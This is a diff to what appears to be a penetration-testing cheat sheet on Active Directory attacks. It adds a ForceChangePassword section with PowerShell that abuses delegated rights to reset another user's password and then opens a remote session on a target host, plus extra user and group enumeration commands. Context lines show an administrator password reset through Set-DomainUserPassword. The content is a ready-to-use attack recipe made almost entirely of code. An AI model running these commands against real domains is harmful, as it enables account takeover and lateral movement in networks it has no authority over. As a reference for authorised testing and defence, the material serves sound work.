@@ -221,7 +221,7 @@ MATCH c=(a)-[:CanPSRemote]->(b) RETURN c
 MATCH (u:User) WHERE ANY (x IN u.serviceprincipalnames WHERE toUpper(x) CONTAINS '<search string>') RETURN u
 ```
 
-GenericAll
+- GenericAll
 
 [![Windows](https://badgen.net/badge/icon/windows?icon=windows&label)](https://microsoft.com/windows/)
 
@@ -258,6 +258,20 @@ $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
 Set-DomainUserPassword -Identity administrator -AccountPassword $UserPassword -Credential $Cred
 ```
 
+- ForceChangePassword
+
+```powershell
+# member who has permission 
+$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential ("<ADAccount>", $password )
+# using same password to change target user's password
+Set-ADAccountPassword -Identity "<Target ADAccount>" -Reset -NewPassword $password -Credential $cred
+
+# we can use Enter-PSSession to connect to target host
+$cred = New-Object System.Management.Automation.PSCredential ("<Target ADAccount>", $password )
+Enter-PSSession -ComputerName <computer_name> -Credential $cred
+```
+
 ### :open_file_folder: PowerView
 
 ```powershell
@@ -278,8 +292,11 @@ Get-NetUser
 # find AD users
 Get-ADUser -Identity <AD account> -Server <domain controller> -Properties *
 Get-ADUser -Filter * -Properties * | select Name, SamAccountName, Description
+Get-DomainUser -Identity <AD account> -Properties MemberOf, objectsid
 # password last set
 Get-NetUser -properties name, pwdlastset, logoncount, badpwdcount
+# GroupMembers
+Get-ADGroupMember -Identity <groupname>
 ```
 
 ```powershell
